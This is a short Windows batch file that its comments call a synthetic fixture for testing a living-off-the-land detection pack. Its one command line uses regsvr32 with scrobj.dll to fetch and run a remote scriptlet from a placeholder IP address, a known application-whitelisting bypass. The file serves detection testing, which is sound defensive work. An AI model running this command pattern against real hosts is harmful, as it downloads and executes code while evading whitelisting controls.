@echo off
REM SYNTHETIC fixture — LOLBAS living-off-the-land binary abuse (regsvr32 scrobj/AWL bypass).
REM Payload shape sourced from LOLBAS (https://lolbas-project.github.io/, Regsvr32).
REM Used to prove the lolbin_windows pack detects native-binary execution. NOT live malware.
regsvr32.exe /s /n /u /i:http://198.51.100.10/payload.sct scrobj.dll
